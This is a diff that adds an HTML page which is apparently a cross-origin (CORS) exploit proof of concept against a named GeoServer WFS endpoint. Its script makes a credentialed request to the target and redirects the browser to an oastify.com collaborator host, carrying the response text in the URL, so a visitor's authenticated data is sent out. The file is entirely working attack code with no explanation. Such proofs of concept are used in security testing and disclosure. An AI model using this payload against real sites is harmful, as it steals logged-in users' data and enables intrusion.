@@ -1,0 +1,14 @@
+<html>
+<body>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('GET','https://gap-test.ftr.com:8443/geoserver/gap/wfs?request=DescribeFeatureType&version=2.0.0&service=wfs&typeNames=gap%3Aco&outputFormat=application%2Fjson',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+    document.location='https://je1ttgoqadhranzmdwz33gjppgv7jx7m.oastify.com?data='+encodeURIComponent(this.responseText);
+};
+</script>
+</body>
+</html>
